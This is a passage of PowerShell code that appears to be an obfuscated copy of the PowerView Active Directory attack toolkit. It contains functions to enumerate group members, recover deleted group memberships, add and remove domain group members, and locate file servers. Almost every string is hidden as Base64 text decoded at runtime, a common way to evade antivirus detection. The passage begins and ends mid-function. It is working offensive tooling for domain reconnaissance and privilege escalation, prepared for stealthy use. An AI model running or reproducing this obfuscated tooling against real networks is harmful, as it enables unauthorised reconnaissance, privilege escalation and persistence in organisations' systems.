                        $ConvertedIdentityInstance = $IdentityInstance.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $GroupDomain
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose "[Get-DomainGroupMember] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }
                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter)"
                try {
                    $Result = $GroupSearcher.FindOne()
                }
                catch {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity '$Identity': $_"
                    $Members = @()
                }
                $GroupFoundName = ''
                $GroupFoundDN = ''
                if ($Result) {
                    $Members = $Result.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA'))))
                    if ($Members.count -eq 0) {
                        $Finished = $False
                        $Bottom = 0
                        $Top = 0
                        while (-not $Finished) {
                            $Top = $Bottom + 1499
                            $MemberRange="member;range=$Bottom-$Top"
                            $Bottom += 1500
                            $Null = $GroupSearcher.PropertiesToLoad.Clear()
                            $Null = $GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                            $Null = $GroupSearcher.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))
                            $Null = $GroupSearcher.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))
                            try {
                                $Result = $GroupSearcher.FindOne()
                                $RangedProperty = $Result.Properties.PropertyNames -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAqAA==')))
                                $Members += $Result.Properties.item($RangedProperty)
                                $GroupFoundName = $Result.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                                $GroupFoundDN = $Result.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                                if ($Members.count -eq 0) {
                                    $Finished = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $Finished = $True
                            }
                        }
                    }
                    else {
                        $GroupFoundName = $Result.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                        $GroupFoundDN = $Result.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                        $Members += $Result.Properties.item($RangedProperty)
                    }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                }
            }
            ForEach ($Member in $Members) {
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    $ObjectSearcherArguments = $SearcherArguments.Clone()
                    $ObjectSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Member
                    $ObjectSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                    $ObjectSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAYwBuACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQALABvAGIAagBlAGMAdABjAGwAYQBzAHMA')))
                    $Object = Get-DomainObject @ObjectSearcherArguments
                    $Properties = $Object.Properties
                }
                if ($Properties) {
                    $GroupMember = New-Object PSObject
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) $GroupFoundDomain
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupFoundName
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) $GroupFoundDN
                    if ($Properties.objectsid) {
                        $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        $MemberSID = $Null
                    }
                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        if ($MemberDN -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBpAGcAbgBTAGUAYwB1AHIAaQB0AHkAUAByAGkAbgBjAGkAcABhAGwAcwB8AFMALQAxAC0ANQAtADIAMQA=')))) {
                            try {
                                if (-not $MemberSID) {
                                    $MemberSID = $Properties.cn[0]
                                }
                                $MemberSimpleName = Convert-ADName -Identity $MemberSID -OutputType $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA'))) @ADNameArguments
                                if ($MemberSimpleName) {
                                    $MemberDomain = $MemberSimpleName.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                    $MemberDomain = $Null
                                }
                            }
                            catch {
                                Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                $MemberDomain = $Null
                            }
                        }
                        else {
                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }
                    if ($Properties.samaccountname) {
                        $MemberName = $Properties.samaccountname[0]
                    }
                    else {
                        try {
                            $MemberName = ConvertFrom-SID -ObjectSID $Properties.cn[0] @ADNameArguments
                        }
                        catch {
                            $MemberName = $Properties.cn[0]
                        }
                    }
                    if ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))) {
                        $MemberObjectClass = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))
                    }
                    elseif ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))) {
                        $MemberObjectClass = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                    }
                    elseif ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))) {
                        $MemberObjectClass = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                    }
                    else {
                        $MemberObjectClass = $Null
                    }
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $MemberDomain
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) $MemberName
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) $MemberDN
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATwBiAGoAZQBjAHQAQwBsAGEAcwBzAA=='))) $MemberObjectClass
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAUwBJAEQA'))) $MemberSID
                    $GroupMember.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAATQBlAG0AYgBlAHIA'))))
                    $GroupMember
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQA=')))] -and $MemberDN -and ($MemberObjectClass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))))) {
                        Write-Verbose "[Get-DomainGroupMember] Manually recursing on group: $MemberDN"
                        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $MemberDN
                        $Null = $SearcherArguments.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            $GroupSearcher.dispose()
        }
    }
}
function Get-DomainGroupMemberDeleted {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
            'LDAPFilter'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBnAHIAbwB1AHAAKQA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach($XMLNode in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA=')))]) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAFYAQQBMAFUARQBfAE0ARQBUAEEAXwBEAEEAVABBAA=='))) -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if (($TempObject.pszAttributeName -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA')))) -and (($TempObject.dwVersion % 2) -eq 0 )) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQATgA='))) $ObjectDN
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABOAA=='))) $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBGAGkAcgBzAHQAQQBkAGQAZQBkAA=='))) $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGUAbABlAHQAZQBkAA=='))) $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBzAEEAZABkAGUAZAA='))) ($TempObject.dwVersion / 2)
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBHAHIAbwB1AHAATQBlAG0AYgBlAHIARABlAGwAZQB0AGUAZAA='))))
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainGroupMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}
function Add-DomainGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $GroupContext = Get-PrincipalContext @ContextArguments
        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning "[Add-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                    $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose "[Add-DomainGroupMember] Adding member '$Member' to group '$Identity'"
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Add($Member)
                $Group.Save()
            }
        }
    }
}
function Remove-DomainGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $GroupContext = Get-PrincipalContext @ContextArguments
        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning "[Remove-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                    $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose "[Remove-DomainGroupMember] Removing member '$Member' from group '$Identity'"
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Remove($Member)
                $Group.Save()
            }
        }
    }
}
function Get-DomainFileServer {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function Split-Path {
            Param([String]$Path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }
        $SearcherArguments = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoACEAKAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQApACgAfAAoAGgAbwBtAGUAZABpAHIAZQBjAHQAbwByAHkAPQAqACkAKABzAGMAcgBpAHAAdABwAGEAdABoAD0AKgApACgAcAByAG8AZgBpAGwAZQBwAGEAdABoAD0AKgApACkAKQA=')))
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQAsAHMAYwByAGkAcAB0AHAAYQB0AGgALABwAHIAbwBmAGkAbABlAHAAYQB0AGgA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain
                $UserSearcher = Get-DomainSearcher @SearcherArguments
                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {Split-Path($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if ($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {Split-Path($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if ($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {Split-Path($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | Sort-Object -Unique
            }
        }
        else {
            $UserSearcher = Get-DomainSearcher @SearcherArguments
